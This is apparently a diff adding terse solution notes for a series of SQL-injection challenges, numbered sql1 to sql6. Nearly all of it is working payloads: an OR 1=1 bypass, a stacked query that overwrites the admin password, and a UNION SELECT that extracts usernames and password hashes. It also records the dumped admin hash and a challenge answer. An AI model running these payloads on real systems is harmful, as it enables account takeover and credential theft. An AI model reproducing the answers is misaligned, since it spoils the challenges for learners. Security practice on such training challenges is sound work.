@@ -1,0 +1,14 @@
+This requires some database knowlege and Query language to perform this
+
+
+sql1 through 4:
+ some straightforward injection using 'OR 1=1 -- and similar
+  
+sql5:
+its proquesql - using ; to stack the query
+	:: id=login;UPDATE users SET pass='123' WHERE user='admin'-- ::
+
+sql6:
+	news.php?id=1 null union select concat(username,CHAR(58),password) from users where username=CHAR(97,100,109,105,110)--
+	it showed me ( admin:0e7a8174f2df63b978db2ccf9af546ce )
+	:: YjndjP90 ::
